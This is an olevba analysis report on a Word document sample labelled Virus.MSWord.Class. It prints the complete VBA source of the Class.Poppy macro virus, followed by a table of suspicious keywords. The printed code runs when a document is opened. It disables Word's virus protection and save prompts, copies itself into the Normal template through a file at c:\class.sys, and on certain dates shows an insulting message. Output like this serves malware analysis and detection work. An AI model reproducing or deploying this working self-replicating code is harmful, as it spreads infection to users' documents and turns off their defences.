olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Class.fm-e1ab105986f310069b0bb5a399a3c683441c763d
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Class.fm-e1ab105986f310069b0bb5a399a3c683441c763d - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()
'Co.Gene. srl28/03/00 12.42.36EPSON Stylus COLOR 1520 on LPT1:PrequalificaClippy
On Error GoTo out
'Co.Gene. srl28/03/00 12.42.36EPSON Stylus COLOR 1520 on LPT1:PrequalificaClippy
Options.VirusProtection = False
'Co.Gene. srl28/03/00 12.42.36EPSON Stylus COLOR 1520 on LPT1:PrequalificaClippy
Options.SaveNormalPrompt = False
'Co.Gene. srl28/03/00 12.42.36EPSON Stylus COLOR 1520 on LPT1:PrequalificaClippy
Options.ConfirmConversions = False
'Co.Gene. srl28/03/00 12.42.36EPSON Stylus COLOR 1520 on LPT1:PrequalificaClippy
ad = ActiveDocument.VBProject.VBComponents.Item(1).codemodule.CountOfLines
'Co.Gene. srl28/03/00 12.42.36EPSON Stylus COLOR 1520 on LPT1:PrequalificaClippy
nt = NormalTemplate.VBProject.VBComponents.Item(1).codemodule.CountOfLines
'Co.Gene. srl28/03/00 12.42.36EPSON Stylus COLOR 1520 on LPT1:PrequalificaClippy
If nt > 70 And ad > 0 Then GoTo out
'Co.Gene. srl28/03/00 12.42.36EPSON Stylus COLOR 1520 on LPT1:PrequalificaClippy
If nt < 70 Then
'Co.Gene. srl28/03/00 12.42.36EPSON Stylus COLOR 1520 on LPT1:PrequalificaClippy
    Set host = NormalTemplate.VBProject.VBComponents.Item(1)
'Co.Gene. srl28/03/00 12.42.36EPSON Stylus COLOR 1520 on LPT1:PrequalificaClippy
    ActiveDocument.VBProject.VBComponents.Item(1).Name = host.Name
'Co.Gene. srl28/03/00 12.42.36EPSON Stylus COLOR 1520 on LPT1:PrequalificaClippy
    ActiveDocument.VBProject.VBComponents.Item(1).Export "c:\class.sys"
'Co.Gene. srl28/03/00 12.42.36EPSON Stylus COLOR 1520 on LPT1:PrequalificaClippy
End If
'Co.Gene. srl28/03/00 12.42.36EPSON Stylus COLOR 1520 on LPT1:PrequalificaClippy
If ad = 0 Then Set host = ActiveDocument.VBProject.VBComponents.Item(1)
'Co.Gene. srl28/03/00 12.42.36EPSON Stylus COLOR 1520 on LPT1:PrequalificaClippy
If Day(Now) = 14 And (Month(Now) > 5) Then MsgBox "I Think " & Application.UserName & " is a big stupid jerk!", 0, "VicodinES Loves You / Class.Poppy"
'Co.Gene. srl28/03/00 12.42.36EPSON Stylus COLOR 1520 on LPT1:PrequalificaClippy
host.codemodule.AddFromFile ("c:\class.sys")
'Co.Gene. srl28/03/00 12.42.36EPSON Stylus COLOR 1520 on LPT1:PrequalificaClippy
With host.codemodule
'Co.Gene. srl28/03/00 12.42.36EPSON Stylus COLOR 1520 on LPT1:PrequalificaClippy
    For x = 1 To 4
'Co.Gene. srl28/03/00 12.42.36EPSON Stylus COLOR 1520 on LPT1:PrequalificaClippy
    .deletelines 1
'Co.Gene. srl28/03/00 12.42.36EPSON Stylus COLOR 1520 on LPT1:PrequalificaClippy
    Next x
'Co.Gene. srl28/03/00 12.42.36EPSON Stylus COLOR 1520 on LPT1:PrequalificaClippy
End With
'Co.Gene. srl28/03/00 12.42.36EPSON Stylus COLOR 1520 on LPT1:PrequalificaClippy
If nt < 70 Then
'Co.Gene. srl28/03/00 12.42.36EPSON Stylus COLOR 1520 on LPT1:PrequalificaClippy
    With host.codemodule
'Co.Gene. srl28/03/00 12.42.36EPSON Stylus COLOR 1520 on LPT1:PrequalificaClippy
    .replaceline 1, "Sub AutoClose()"
'Co.Gene. srl28/03/00 12.42.36EPSON Stylus COLOR 1520 on LPT1:PrequalificaClippy
    .replaceline 71, "Sub ToolsMacro()"
'Co.Gene. srl28/03/00 12.42.36EPSON Stylus COLOR 1520 on LPT1:PrequalificaClippy
    End With
'Co.Gene. srl28/03/00 12.42.36EPSON Stylus COLOR 1520 on LPT1:PrequalificaClippy
End If
'Co.Gene. srl28/03/00 12.42.36EPSON Stylus COLOR 1520 on LPT1:PrequalificaClippy
With host.codemodule
'Co.Gene. srl28/03/00 12.42.36EPSON Stylus COLOR 1520 on LPT1:PrequalificaClippy
    For x = 2 To 72 Step 2
'Co.Gene. srl28/03/00 12.42.36EPSON Stylus COLOR 1520 on LPT1:PrequalificaClippy
    .replaceline x, "'" & Application.UserName & Now & Application.ActivePrinter & Application.ActiveWindow & Application.Assistant
'Co.Gene. srl28/03/00 12.42.36EPSON Stylus COLOR 1520 on LPT1:PrequalificaClippy
    Next x
'Co.Gene. srl28/03/00 12.42.36EPSON Stylus COLOR 1520 on LPT1:PrequalificaClippy
End With
'Co.Gene. srl28/03/00 12.42.36EPSON Stylus COLOR 1520 on LPT1:PrequalificaClippy
out:
'Co.Gene. srl28/03/00 12.42.36EPSON Stylus COLOR 1520 on LPT1:PrequalificaClippy
If nt > 70 And ad = 0 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
'Co.Gene. srl28/03/00 12.42.36EPSON Stylus COLOR 1520 on LPT1:PrequalificaClippy
End Sub
'Co.Gene. srl28/03/00 12.42.36EPSON Stylus COLOR 1520 on LPT1:PrequalificaClippy
Sub ViewVBCode()
'Co.Gene. srl28/03/00 12.42.36EPSON Stylus COLOR 1520 on LPT1:PrequalificaClippy
End Sub


+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

